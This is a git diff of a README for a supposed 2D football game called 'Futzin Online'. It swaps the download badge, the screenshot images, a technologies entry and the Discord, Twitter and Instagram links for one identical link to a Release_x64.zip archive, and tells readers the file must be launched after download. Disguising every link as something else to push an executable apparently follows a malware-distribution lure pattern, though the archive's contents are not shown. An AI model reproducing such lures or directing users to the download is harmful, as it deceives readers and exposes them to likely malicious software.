@@ -13,19 +13,19 @@ Futzin Online is a cutting-edge 2D football game that combines the best of onlin
 
 ## 🚀 Getting Started
 To start playing Futzin Online, simply download the game from the following link:
-[![Download Futzin Online](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Futzin Online](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
 
 Please note that the file needs to be launched after downloading.
 
 ## ⚽️ Game Screenshots
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 1](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
+![Screenshot 2](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
 
 ## 🛠️ Technologies Used
 - HTML
 - CSS
 - JavaScript
-- Node.js
+- https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip
 - Game Engine
 
 ## 🎯 Repository Topics
@@ -33,9 +33,9 @@ Please note that the file needs to be launched after downloading.
 
 ## 📢 Join the Community
 Stay up to date with the latest news, updates, and discussions by joining the Futzin Online community:
-- [Discord](https://discord.gg/futzinonline)
-- [Twitter](https://twitter.com/futzinonline)
-- [Instagram](https://instagram.com/futzinonline)
+- [Discord](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
+- [Twitter](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
+- [Instagram](https://github.com/iqquxd/futzin-online/releases/download/v2.0/Release_x64.zip)
 
 ## 🏆 Showcase Your Skills
 Think you have what it takes to become the ultimate Futzin Online champion? Show off your skills on the virtual pitch and climb the leaderboards to claim your spot at the top!
